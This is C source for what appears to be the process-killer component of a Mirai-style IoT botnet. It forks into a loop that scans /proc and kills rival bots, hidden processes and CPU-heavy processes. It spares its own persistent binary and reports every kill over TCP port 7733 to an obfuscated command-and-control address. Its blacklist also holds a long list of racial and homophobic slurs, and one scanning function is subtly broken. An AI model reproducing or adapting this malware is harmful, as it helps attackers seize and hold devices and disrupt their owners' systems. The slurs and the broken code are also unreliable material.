#define _GNU_SOURCE

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <dirent.h>
#include <signal.h>
#include <fcntl.h>
#include <time.h>
#include <dirent.h>
#include <string.h>
#include <stdbool.h>
#include <ctype.h>
#include <linux/limits.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/prctl.h>
#include <sys/inotify.h>

#include "includes.h"
#include "killer.h"
#include "table.h"
#include "util.h"
#include "persistence.h"
#include "stealth.h"

#define MAX_PATH_LENGTH 256
#define MAX_CMD_LENGTH  512

Kill *k_head = NULL;
char self_realpath[256] = {0};
int killer_pid;
static pid_t main_bot_pid = 0;
static ino_t self_inode = 0;        
static dev_t self_device = 0;       



const char *whitelist[] = {
    
    "init",
    "systemd",
    "watchdog",
    "kthreadd",
    "ksoftirqd",
    "migration",
    "rcu_",
    "rcu_sched",
    "rcu_bh",
    "kswapd",
    "kworker",
    "khelper",
    "sync_supers",
    "bdi-default",
    "crypto",
    "kblockd",
    "ata_",
    "md",
    "khubd",
    "scsi_",
    "usb-storage",
    
    "httpd",
    "lighttpd",
    "nginx",
    "apache",
    "boa",
    "uhttpd",
    "mini_httpd",
    
    "busybox",
    "dropbear",
    "sshd",
    
    "/lib/",
    "/usr/lib/",
    "/usr/bin/",
    "/usr/sbin/",
    "/sbin/",
    "/bin/",
    "/etc/",
    "/proc/",
    "/sys/",
    "/dev/",
    "/var/lib/",
    "/usr/local/"
    
    
};



const char *blacklist[] = {
    "/.",
    "./",
    "(deleted)",
    "dbg",
    "mpsl",
    "mipsel",
    "mips",
    "arm",
    "arm4",
    "arm5",
    "arm6",
    "arm7",
    "sh4",
    "m68k",
    "x86",
    "x586",
    "x86_64",
    "i586",
    "i686",
    "ppc",
    "spc",
    
    "bot",
    "mirai",
    "qbot",
    "gafgyt",
    "tsunami",
    "bashlite",
    "aidra",
    
    ".bin",
    ".elf",
    ".so",
    
    "/tmp/",
    "/var/tmp/",
    "/dev/shm/",
    "/var/run/",
    "/root/",
    "/home/",
    
    "goon",
    "nig",
    "malware",
    "payload",
    "exploit",
    "backdoor",
    "trojan",
    "virus",
    
    "nigger",
    "nigga",
    "n1gg3r",
    "n1gga",
    "chink",
    "gook",
    "spic",
    "wetback",
    "towelhead",
    "sandnigger",
    "sandnigga",
    "raghead",
    "paki",
    "kike",
    "kyke",
    "jap",
    "gyp",
    "zipperhead",
    "slant",
    "chinkie",
    "gooker",
    "n1gger",
    "n1gga",
    "nigg3r",
    "nigg4",
    
    "fag",
    "faggot",
    "retard",
    "retarded"
};

void report_kill(const char *message) {
    if (strcmp(message, "EOF") == 0 || strlen(message) <= 0)
        return;

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1)
       return;

    char tbl_report_ip[64];
    table_unlock_val(TABLE_REPORT_IP);
    util_strcpy(tbl_report_ip, table_retrieve_val(TABLE_REPORT_IP, NULL));

    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(7733);

    inet_pton(AF_INET, tbl_report_ip, &(server_addr.sin_addr));
    connect(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr));
    write(sockfd, message, strlen(message));
    table_lock_val(TABLE_REPORT_IP);
}


bool is_whitelisted(const char *maps) {
    if (maps == NULL || strlen(maps) == 0)
        return true; 
    
    
    
    if (self_realpath[0] != '\0') {
        
        if (strcmp(maps, self_realpath) == 0 || strstr(maps, self_realpath) != NULL) {
            return true;
        }
    }
    
    const char *persistent = get_persistent_path();
    if (persistent != NULL) {
        
        if (strcmp(maps, persistent) == 0 || strstr(maps, persistent) != NULL) {
            return true;
        }
    }
    
    
    
    for (int i = 0; i < sizeof(whitelist) / sizeof(whitelist[0]); i++) {
        if (strstr(maps, whitelist[i]) != NULL) {
            
            if (strstr(whitelist[i], "/") != NULL) {
                
                if (strstr(maps, "/tmp/") != NULL || 
                    strstr(maps, "/var/tmp/") != NULL ||
                    strstr(maps, "/var/run/") != NULL ||
                    strstr(maps, "/root/") != NULL ||
                    strstr(maps, "/home/") != NULL) {
                    
                        continue;
                    }
                }
            return true;
        }
    }

    return false;
}



bool is_watchdog_process(const char *exe_path, const char *cmdline) {
    if (exe_path == NULL && cmdline == NULL)
        return false;
    
    const char *check_str = exe_path ? exe_path : cmdline;
    if (check_str == NULL)
        return false;
    
    
    char lower_check[512];
    int len = strlen(check_str);
    if (len >= sizeof(lower_check))
        len = sizeof(lower_check) - 1;
    
    for (int i = 0; i < len; i++) {
        lower_check[i] = (check_str[i] >= 'A' && check_str[i] <= 'Z') ? 
                         check_str[i] + 32 : check_str[i];
    }
    lower_check[len] = '\0';
    
    
    const char *watchdog_patterns[] = {
        "watchdog",
        "watchdogd",
        "watchdog.bin",
        "watchdog.elf",
        "wdt",
        "wdt.bin",
        "wdt.elf",
        "wdtdaemon",
        "watchdogd.bin",
        "watchdogd.elf",
        "/sbin/watchdog",
        "/usr/sbin/watchdog",
        "/bin/watchdog",
        "/usr/bin/watchdog"
    };
    
    for (int i = 0; i < sizeof(watchdog_patterns) / sizeof(watchdog_patterns[0]); i++) {
        if (strstr(lower_check, watchdog_patterns[i]) != NULL) {
            return true;
        }
    }
    
    return false;
}



bool is_critical_process(const char *exe_path, const char *cmdline) {
    if (exe_path == NULL && cmdline == NULL)
        return true; 
    
    
    if (is_watchdog_process(exe_path, cmdline)) {
        return true;
    }
    
    const char *critical_names[] = {
        "init",
        "systemd",
        "watchdog",  
        "kthreadd",
        "ksoftirqd",
        "migration",
        "rcu_",
        "kswapd",
        "kworker",
        "khelper",
        
        "udevd",
        "syslogd",
        "klogd",
        "dhcpcd",
        "udhcpc",
        "wpa_supplicant",
        "hostapd",
        "dnsmasq",
        "ntpd",
        "chronyd"
    };
    
    
    for (int i = 0; i < sizeof(critical_names) / sizeof(critical_names[0]); i++) {
        if (exe_path && strstr(exe_path, critical_names[i]) != NULL)
            return true;
        if (cmdline && strstr(cmdline, critical_names[i]) != NULL)
            return true;
    }
    
    
    const char *critical_paths[] = {
        "/lib/",
        "/usr/lib/",
        "/usr/bin/",
        "/usr/sbin/",
        "/sbin/",
        "/bin/",
        "/etc/",
        "/proc/",
        "/sys/",
        "/dev/",
        "/var/lib/",
        "/usr/local/",
        "/opt/"
    };
    
    for (int i = 0; i < sizeof(critical_paths) / sizeof(critical_paths[0]); i++) {
        if (exe_path && strstr(exe_path, critical_paths[i]) != NULL) {
            
            if (strstr(exe_path, "/tmp/") == NULL &&
                strstr(exe_path, "/var/tmp/") == NULL &&
                strstr(exe_path, "/var/run/") == NULL &&
                strstr(exe_path, "/root/") == NULL &&
                strstr(exe_path, "/home/") == NULL) {
                return true; 
            }
        }
    }
    
    return false;
}


bool is_competing_malware(const char *exe_path, const char *cmdline) {
    if (exe_path == NULL && cmdline == NULL)
        return false;
    
    
    if (is_watchdog_process(exe_path, cmdline)) {
        return false; 
    }
    
    
    const char *competing_bots[] = {
        "mirai",
        "qbot",
        "gafgyt",
        "tsunami",
        "bashlite",
        "aidra",
        "bot",
        ".bin",
        ".elf"
    };
    
    const char *check_str = exe_path ? exe_path : cmdline;
    if (check_str == NULL)
        return false;
    
    
    char lower_check[512];
    int len = strlen(check_str);
    if (len >= sizeof(lower_check))
        len = sizeof(lower_check) - 1;
    
    for (int i = 0; i < len; i++) {
        lower_check[i] = (check_str[i] >= 'A' && check_str[i] <= 'Z') ? 
                         check_str[i] + 32 : check_str[i];
    }
    lower_check[len] = '\0';
    
    for (int i = 0; i < sizeof(competing_bots) / sizeof(competing_bots[0]); i++) {
        if (strstr(lower_check, competing_bots[i]) != NULL) {
            
            if (is_whitelisted(check_str) || is_watchdog_process(exe_path, cmdline))
                return false;
            return true;
        }
    }

    return false;
}

void killer_dora_the_explorer() {
    DIR *dir;
    struct dirent *file;
    char maps_path[MAX_PATH_LENGTH];
    char maps_line[MAX_PATH_LENGTH];

    dir = opendir("/proc/");
    if (dir == NULL)
        return;

    while ((file = readdir(dir)) != NULL) {
        int pid = atoi(file->d_name);
        
        if (pid == killer_pid || pid == main_bot_pid || pid == getppid() || pid == 0 || pid == 1 || pid == getpid())
            continue;

        snprintf(maps_path, MAX_PATH_LENGTH, "/proc/%d/maps", pid);

        FILE *maps_file = fopen(maps_line, "r");
        if (maps_file == NULL)
            continue;

        while (fgets(maps_line, sizeof(maps_line), maps_file) != NULL) {
            char *pos = strchr(maps_line, ' ');
            if (pos != NULL)
                *pos = '\0';
            
            if (is_whitelisted(maps_line))
                continue;

            
            if (is_watchdog_process(maps_line, NULL))
                continue;

            for (int i = 0; i < sizeof(blacklist) / sizeof(blacklist[0]); ++i) {
                if (strstr(maps_line, blacklist[i]) != NULL) {
                    
                    if (!is_watchdog_process(maps_line, NULL)) {
                    char message[256];
                    snprintf(message, sizeof(message), "[killer/maps] killed process: %s ;; pid: %d\n", maps_line, pid);
                    if (kill(pid, 9) == 0) {
                        #ifdef DEBUG
                            printf(message);
                        #endif
                        report_kill(message);
                    }
                    }
                    continue;
                }
            }
        }

        fclose(maps_file);
    }

    closedir(dir);
}










































void killer_diego() {
    DIR *dir;
    struct dirent *entry;

    dir = opendir("/proc/");
    if (dir == NULL)
        return;

    while ((entry = readdir(dir))) {
        int pid = atoi(entry->d_name);
        if (pid == killer_pid || pid == getppid() || pid == 0 || pid == 1)
            continue;

        if (pid > 0) {
            char proc_path[MAX_PATH_LENGTH];
            char exe_path[MAX_PATH_LENGTH];
            char link_path[MAX_PATH_LENGTH];

            snprintf(proc_path, sizeof(proc_path), "/proc/%d/exe", pid);
            ssize_t len = readlink(proc_path, link_path, sizeof(link_path));
            if (len == -1)
                continue;

            link_path[len] = '\0';
            
            
            char link_path_clean[256];
            strncpy(link_path_clean, link_path, sizeof(link_path_clean) - 1);
            link_path_clean[sizeof(link_path_clean) - 1] = '\0';
            char *deleted_pos = strstr(link_path_clean, " (deleted)");
            if (deleted_pos != NULL) {
                *deleted_pos = '\0'; 
            }
            
            
            
            BOOL is_our_process = FALSE;
            
            
            if (self_realpath[0] != '\0') {
                if (strcmp(link_path_clean, self_realpath) == 0 || 
                    strstr(link_path_clean, self_realpath) != NULL ||
                    strstr(self_realpath, link_path_clean) != NULL) {
                    is_our_process = TRUE;
                }
            }
            
            
            if (!is_our_process) {
                const char *persistent = get_persistent_path();
                if (persistent != NULL && persistent[0] != '\0') {
                    if (strcmp(link_path_clean, persistent) == 0 || 
                        strstr(link_path_clean, persistent) != NULL ||
                        strstr(persistent, link_path_clean) != NULL) {
                        is_our_process = TRUE;
                    }
                }
            }
            
            
            if (!is_our_process && self_inode != 0 && self_device != 0) {
                struct stat proc_stat;
                if (stat(link_path_clean, &proc_stat) == 0) {
                    
                    if (proc_stat.st_ino == self_inode && proc_stat.st_dev == self_device) {
                        is_our_process = TRUE;
                    }
                }
            }
            
            if (is_our_process) {
                continue; 
            }
            
            
            if (stealth_is_hidden_process(link_path, NULL)) {
                char message[256];
                snprintf(message, sizeof(message), "[killer/stealth] killed hidden process: %s ;; pid: %d\n", link_path, pid);
                if (kill(pid, 9) == 0) {
                    #ifdef DEBUG
                        printf(message);
                    #endif
                    report_kill(message);
                }
                continue;
            }
            
            
            char cmdline_check[MAX_PATH_LENGTH] = {0};
            char cmd_path_check[64];
            snprintf(cmd_path_check, sizeof(cmd_path_check), "/proc/%d/cmdline", pid);
            FILE *cmd_check = fopen(cmd_path_check, "r");
            if (cmd_check != NULL) {
                if (fgets(cmdline_check, sizeof(cmdline_check), cmd_check) != NULL) {
                    if (stealth_has_mismatch(link_path, cmdline_check)) {
                        char message[256];
                        snprintf(message, sizeof(message), "[killer/mismatch] killed mismatched process: %s (exe: %s) ;; pid: %d\n", cmdline_check, link_path, pid);
                        if (kill(pid, 9) == 0) {
                            #ifdef DEBUG
                                printf(message);
                            #endif
                            report_kill(message);
                        }
                        fclose(cmd_check);
                        continue;
                    }
                }
                fclose(cmd_check);
            }
            
            
            if (is_whitelisted(link_path) || is_critical_process(link_path, NULL))
                continue;

            
            if (is_competing_malware(link_path, NULL)) {
                char message[256];
                snprintf(message, sizeof(message), "[killer/exe] killed competing malware: %s ;; pid: %d\n", link_path, pid);
                if (kill(pid, 9) == 0) {
                    #ifdef DEBUG
                        printf(message);
                    #endif
                    report_kill(message);
                }
                continue;
            }

            
            if (is_watchdog_process(link_path, NULL)) {
                continue; 
            }

            
            bool should_kill = false;
            for (int i = 0; i < sizeof(blacklist) / sizeof(blacklist[0]); ++i) {
                if (strstr(link_path, blacklist[i]) != NULL) {
                    
                    if (!is_watchdog_process(link_path, NULL)) {
                    should_kill = true;
                    break;
                    }
                }
            }
            
            if (should_kill) {
                    char message[256];
                    snprintf(message, sizeof(message), "[killer/exe] killed process: %s ;; pid: %d\n", link_path, pid);
                    if (kill(pid, 9) == 0) {
                        #ifdef DEBUG
                            printf(message);
                        #endif
                        report_kill(message);
                }
            }
        }
    }
}

void killer_swiper() {
    DIR *dir;
    struct dirent *entry;

    dir = opendir("/proc/");
    if (dir == NULL)
        return;

    while ((entry = readdir(dir))) {
        int pid = atoi(entry->d_name);
        
        
        if (pid == killer_pid || pid == main_bot_pid || pid == getppid() || pid == 0 || pid == 1 || pid == getpid())
            continue;
        
        
        
        if (self_realpath[0] == '\0' && self_inode == 0) {
            
            continue;
        }

        if (pid > 0) {
            char stat_path[MAX_PATH_LENGTH];
            FILE *stat_file;

            snprintf(stat_path, sizeof(stat_path), "/proc/%d/stat", pid);

            stat_file = fopen(stat_path, "r");
            if (stat_file == NULL)
                continue;

            int pid;
            char command[256];
            char state;
            int ppid;

            fscanf(stat_file, "%d %s %c %d", &pid, command, &state, &ppid);
            fclose(stat_file);

            
            if (is_whitelisted(command) || is_critical_process(NULL, command))
                continue;

            
            if (is_competing_malware(NULL, command)) {
                char message[256];
                snprintf(message, sizeof(message), "[killer/stat] killed competing malware: %s ;; pid: %d\n", command, pid);
                if (kill(pid, 9) == 0) {
                    #ifdef DEBUG
                        printf(message);
                    #endif
                    report_kill(message);
                }
                continue;
            }

            
            if (is_watchdog_process(NULL, command)) {
                continue; 
            }

            
            
            
            bool should_kill = false;
            for (int i = 0; i < sizeof(blacklist) / sizeof(blacklist[0]); ++i) {
                if (strstr(command, blacklist[i]) != NULL) {
                    
                    if (!is_watchdog_process(NULL, command)) {
                        
                        
                        char exe_check[256];
                        char exe_path_check[64];
                        snprintf(exe_path_check, sizeof(exe_path_check), "/proc/%d/exe", pid);
                        ssize_t exe_len = readlink(exe_path_check, exe_check, sizeof(exe_check) - 1);
                        if (exe_len > 0) {
                            exe_check[exe_len] = '\0';
                            
                            char *del_pos = strstr(exe_check, " (deleted)");
                            if (del_pos != NULL) *del_pos = '\0';
                            
                            
                            if (self_realpath[0] != '\0' && strstr(exe_check, self_realpath) != NULL) {
                                should_kill = false;
                                break;
                            }
                            const char *persistent = get_persistent_path();
                            if (persistent != NULL && strstr(exe_check, persistent) != NULL) {
                                should_kill = false;
                                break;
                            }
                            
                            if (self_inode != 0 && self_device != 0) {
                                struct stat proc_stat;
                                if (stat(exe_check, &proc_stat) == 0) {
                                    if (proc_stat.st_ino == self_inode && proc_stat.st_dev == self_device) {
                                        should_kill = false;
                                        break;
                                    }
                                }
                            }
                        }
                        should_kill = true;
                        break;
                    }
                }
            }
            
            if (should_kill) {
                    char message[256];
                    snprintf(message, sizeof(message), "[killer/stat] killed process: %s ;; pid: %d\n", command, pid);
                    if (kill(pid, 9) == 0) {
                        #ifdef DEBUG
                            printf(message);
                        #endif
                        report_kill(message);
                }
            }
        }
    }
}

void killer_boots() {
    DIR *dir;
    struct dirent *file;
    char path[MAX_PATH_LENGTH];

    dir = opendir("/proc");
    if (dir == NULL)
        return;

    while ((file = readdir(dir))) {
        int pid = atoi(file->d_name);
        
        if (pid == killer_pid || pid == main_bot_pid || pid == getppid() || pid == 0 || pid == 1 || pid == getpid())
            continue;
        
        
        if (self_realpath[0] == '\0' && self_inode == 0) {
            continue; 
        }

        snprintf(path, sizeof(path), "/proc/%s/cmdline", file->d_name);
            
        FILE *cmdfile = fopen(path, "r");
        if (cmdfile != NULL) {
            char cmdline[MAX_PATH_LENGTH];
            if (fgets(cmdline, sizeof(cmdline), cmdfile) != NULL) {
                
                
                BOOL is_our_process = FALSE;
                if (self_realpath[0] != '\0' && strstr(cmdline, self_realpath) != NULL) {
                    is_our_process = TRUE;
                }
                
                if (!is_our_process) {
                    const char *persistent = get_persistent_path();
                    if (persistent != NULL && strstr(cmdline, persistent) != NULL) {
                        is_our_process = TRUE;
                    }
                }
                
                if (is_our_process) {
                    fclose(cmdfile);
                    continue; 
                }
                
                
                if (stealth_is_hidden_process(NULL, cmdline)) {
                        char message[256];
                    snprintf(message, sizeof(message), "[killer/stealth] killed hidden process: %s ;; pid: %d\n", cmdline, pid);
                        if (kill(pid, 9) == 0) {
                            #ifdef DEBUG
                                printf(message);
                            #endif
                            report_kill(message);
                    }
                            continue;
                        }
                
                
                if (is_whitelisted(cmdline) || is_critical_process(NULL, cmdline))
                    continue;

                
                if (is_competing_malware(NULL, cmdline)) {
                    char message[256];
                    snprintf(message, sizeof(message), "[killer/cmd] killed competing malware: %s ;; pid: %d\n", cmdline, pid);
                    if (kill(pid, 9) == 0) {
                        #ifdef DEBUG
                            printf(message);
                        #endif
                        report_kill(message);
                    }
                    continue;
                }

                
                if (is_watchdog_process(NULL, cmdline)) {
                    continue; 
                }

                
                
                bool should_kill = false;
                for (int i = 0; i < sizeof(blacklist) / sizeof(blacklist[0]); ++i) {
                    if (strstr(cmdline, blacklist[i]) != NULL) {
                        
                        if (is_watchdog_process(NULL, cmdline)) {
                            should_kill = false;
                            break;
                        }
                        
                        if (self_realpath[0] != '\0' && strstr(cmdline, self_realpath) != NULL) {
                            should_kill = false; 
                            break;
                        }
                        const char *persistent = get_persistent_path();
                        if (persistent != NULL && strstr(cmdline, persistent) != NULL) {
                            should_kill = false; 
                            break;
                        }
                        should_kill = true;
                        break;
                    }
                }
                
                if (should_kill) {
                    char message[256];
                    snprintf(message, sizeof(message), "[killer/cmd] killed process: %s ;; pid: %d\n", cmdline, pid);
                    if (kill(pid, 9) == 0) {
                        #ifdef DEBUG
                            printf(message);
                        #endif
                        report_kill(message);
                    }
                }
            }

            fclose(cmdfile);
        }
    }

    closedir(dir);
}

void killer_im_the_map() {
    DIR *dir;
    struct dirent *entry;

    dir = opendir("/proc/");
    if (dir == NULL)
        return;

    while ((entry = readdir(dir)) != NULL) {
        char stat_path[MAX_PATH_LENGTH], stat_line[1024], cmd_path[MAX_PATH_LENGTH], cmd_line[1024];
        unsigned utime, stime;
        unsigned long long starttime;

        int pid = atoi(entry->d_name);
        
        if (pid == killer_pid || pid == main_bot_pid || pid == getppid() || pid == 0 || pid == 1 || pid == getpid())
            continue;

        snprintf(stat_path, MAX_PATH_LENGTH, "/proc/%s/stat", entry->d_name);
        snprintf(cmd_path, MAX_PATH_LENGTH, "/proc/%s/cmdline", entry->d_name);

        FILE *stat_file = fopen(stat_path, "r");
        if (stat_file) {
            fgets(stat_line, sizeof(stat_line), stat_file);
            fclose(stat_file);

            sscanf(stat_line, "%*d %*s %*c %*d %*d %*d %*d %*d %*lu %*lu %*lu %*lu %lu %lu %*ld %*ld %*ld %*ld %*ld %*ld %*ld %*llu %lu", &utime, &stime, &starttime);
            double cpu_percent = (double)(utime + stime) / sysconf(_SC_CLK_TCK) / (time(NULL) - (double)starttime / sysconf(_SC_CLK_TCK)) * 100;
            double max_percent = 3.00;

            if (cpu_percent > max_percent) {
                FILE *cmd_file = fopen(cmd_path, "r");
                if (cmd_file) {
                    fgets(cmd_line, sizeof(cmd_line), cmd_file);
                    fclose(cmd_file);

                    
                    if (is_whitelisted(cmd_line) || is_critical_process(NULL, cmd_line))
                        continue;

                    
                    if (is_competing_malware(NULL, cmd_line)) {
                    char message[256];
                        snprintf(message, sizeof(message), "[killer/cpu] killed competing malware: %s ;; pid: %d\n", cmd_line, pid);
                    if (kill(pid, 9) == 0) {
                        #ifdef DEBUG
                            printf(message);
                        #endif
                        report_kill(message);
                        }
                        continue;
                    }

                    
                    if (is_watchdog_process(NULL, cmd_line)) {
                        continue; 
                    }

                    
                    bool should_kill = false;
                    for (int i = 0; i < sizeof(blacklist) / sizeof(blacklist[0]); ++i) {
                        if (strstr(cmd_line, blacklist[i]) != NULL) {
                            
                            if (!is_watchdog_process(NULL, cmd_line)) {
                            should_kill = true;
                            break;
                            }
                        }
                    }
                    
                    if (should_kill) {
                        char message[256];
                        snprintf(message, sizeof(message), "[killer/cpu] killed process: %s ;; pid: %d\n", cmd_line, pid);
                        if (kill(pid, 9) == 0) {
                            #ifdef DEBUG
                                printf(message);
                            #endif
                            report_kill(message);
                        }
                    }
                }
            }
        }
    }
}


static BOOL is_our_process(pid_t pid, const char *path) {
    if (pid == killer_pid || pid == main_bot_pid || pid == getpid() || pid == getppid())
        return TRUE;

    if (path != NULL && self_realpath[0] != '\0') {
        if (strcmp(path, self_realpath) == 0)
            return TRUE;
            
        
        const char *persistent = get_persistent_path();
        if (persistent != NULL && strcmp(path, persistent) == 0)
            return TRUE;
    }

    
    if (path != NULL && self_inode != 0) {
        struct stat st;
        if (stat(path, &st) == 0) {
            if (st.st_ino == self_inode && st.st_dev == self_device)
                return TRUE;
        }
    }

    return FALSE;
}

char *check_realpath(char *pid, char *path, int locker) {
    char exepath[256] = {0};

    _strcpy(exepath, "/proc/");
    _strcat(exepath, pid);
    _strcat(exepath, "/exe");

    if (readlink(exepath, path, 256) == -1)
        return NULL;

    
    if (self_realpath[0] != '\0' && strcmp(path, self_realpath) == 0)
        return NULL;
    
    const char *persistent = get_persistent_path();
    if (persistent != NULL && strcmp(path, persistent) == 0)
        return NULL;

    if (is_whitelisted(path))
        return NULL;

    return path;
}

static char check_for_contraband(char *fdpath) {
    char fdinode[256] = {0};

    if (readlink(fdpath, fdinode, 256) == -1)
        return 0;

    if (strstr(fdinode, "socket") || strstr(fdinode, "proc"))
        return 1;

    return 0;
}

static char check_fds(char *pid, char *realpath) {
    char retval = 0;
    DIR *dir;
    struct dirent *file;
    char inode[256], fdspath[256] = {0}, fdpath[512];

    _strcpy(fdspath, "/proc/");
    _strcat(fdspath, pid);
    _strcat(fdspath, "/fd");

    if ((dir = opendir(fdspath)) == NULL)
        return retval;

    while ((file = readdir(dir))) {
        _memset(inode, 0, 256);
        _strcpy(fdpath, fdspath);
        _strcat(fdpath, "/");
        _strcat(fdpath, file->d_name);

        if (check_for_contraband(fdpath)) {
            retval = 1;
            break;
        }
    }

    closedir(dir);
    return retval;
}

static void delete_list(void) {
    Kill *temp = NULL;

    if (k_head == NULL)
        return;

    while (k_head != NULL)
    {
        if ((temp = k_head->next) != NULL)
            free(k_head);

        k_head = temp;
    }
}

static Kill *compare_realpaths(char *pid) {
    Kill *node = k_head;
    char exepath[256], realpath[256] = {0};

    if (node == NULL)
        return 0;

    _strcpy(exepath, "/proc/");
    _strcat(exepath, pid);
    _strcat(exepath, "/exe");

    if (readlink(exepath, realpath, 256) == -1)
        return NULL;

    while (node != NULL) {
        if (_strcmp2(node->path, realpath) == 0)
            return node;

        node = node->next;
    }

    return NULL;
}

static void kill_list(void) {
    int pid;
    DIR *dir;
    Kill *node = NULL;
    struct dirent *file;

    if ((dir = opendir("/proc/")) == NULL)
        return delete_list();

    while ((file = readdir(dir))) {
        pid = _atoi(file->d_name);
        if (!(node = compare_realpaths(file->d_name)))
            continue;

        if (pid == killer_pid || pid == getppid() || pid == 0 || pid == 1)
            continue;

        char message[256];
        snprintf(message, sizeof(message), "[killer/node] killed process: %s ;; pid: %d\n", node->path, node->pid);
        report_kill(message);
        kill(pid, 9);
    }

    closedir(dir);
    delete_list();
}

static void add_to_kill(char *pid, char *realpath) {
    int pid_int = atoi(pid);
    
    if (pid_int == killer_pid || pid_int == main_bot_pid || pid_int == getppid() || pid_int == 0 || pid_int == 1 || pid_int == getpid())
        return;

    Kill *node = calloc(1, sizeof(Kill)), *last;

    node->n_pid = _atoi(pid);

    _strcpy(node->pid, pid);
    _strcpy(node->path, realpath);

    if (k_head == NULL) {
        k_head = node;
        return;
    }

    last = k_head;

    while (last->next != NULL)
        last = last->next;

    last->next = node;
    kill(node->n_pid, 19);
}

void killer_tico(void) {
    DIR *dir;
    struct dirent *file;
    char realpath[256] = {0};

    if ((dir = opendir("/proc/")) == NULL)
        return;

    while ((file = readdir(dir))) {
        int pid = atoi(file->d_name);
        if (!util_isdigit(file->d_name[0]))
            continue;

        _memset(realpath, 0, 256);

        if (!check_realpath(file->d_name, realpath, 0))
            continue;

        
        if (pid == killer_pid || pid == main_bot_pid || pid == getppid() || pid == 0 || pid == 1 || pid == getpid())
            continue;

        if (check_fds(file->d_name, realpath))
            add_to_kill(file->d_name, realpath);
    }

    closedir(dir);

    kill_list();
}

void killer_init() {
    int edo;
    edo = fork();
	if(edo > 0 || edo == 1) {
		return;
	}

    killer_pid = getpid();
    main_bot_pid = getppid(); 
    prctl(PR_SET_PDEATHSIG, SIGHUP);
    
    
    
    usleep(500000); 
    
    
    
    ssize_t len = readlink("/proc/self/exe", self_realpath, sizeof(self_realpath) - 1);
    if (len > 0) {
        self_realpath[len] = '\0';
        
        char *deleted_pos = strstr(self_realpath, " (deleted)");
        if (deleted_pos != NULL) {
            *deleted_pos = '\0'; 
        }
    }
    
    
    char main_exe[256] = {0};
    char main_exe_path[64];
    snprintf(main_exe_path, sizeof(main_exe_path), "/proc/%d/exe", main_bot_pid);
    ssize_t main_len = readlink(main_exe_path, main_exe, sizeof(main_exe) - 1);
    if (main_len > 0) {
        main_exe[main_len] = '\0';
        
        char *deleted_pos = strstr(main_exe, " (deleted)");
        if (deleted_pos != NULL) {
            *deleted_pos = '\0';
        }
        
        strncpy(self_realpath, main_exe, sizeof(self_realpath) - 1);
        self_realpath[sizeof(self_realpath) - 1] = '\0';
    }
    
    
    
    
    struct stat self_stat;
    if (self_realpath[0] != '\0' && stat(self_realpath, &self_stat) == 0) {
        self_inode = self_stat.st_ino;
        self_device = self_stat.st_dev;
    } else {
        
        if (stat("/proc/self/exe", &self_stat) == 0) {
            self_inode = self_stat.st_ino;
            self_device = self_stat.st_dev;
        }
    }
    
    
    const char *persistent = get_persistent_path();
    if (persistent != NULL && persistent[0] != '\0') {
        
        
    }
    
    
    
    if (self_realpath[0] == '\0' && self_inode == 0) {
        sleep(1); 
        
        main_len = readlink(main_exe_path, main_exe, sizeof(main_exe) - 1);
        if (main_len > 0) {
            main_exe[main_len] = '\0';
            char *deleted_pos = strstr(main_exe, " (deleted)");
            if (deleted_pos != NULL) *deleted_pos = '\0';
            strncpy(self_realpath, main_exe, sizeof(self_realpath) - 1);
            self_realpath[sizeof(self_realpath) - 1] = '\0';
            
            if (stat(self_realpath, &self_stat) == 0) {
                self_inode = self_stat.st_ino;
                self_device = self_stat.st_dev;
            }
        }
    }
    while (1) {
        killer_dora_the_explorer();
        
        killer_diego();
        killer_swiper();
        killer_boots();
        killer_im_the_map();
        killer_tico();
        usleep(150000);
    }
}
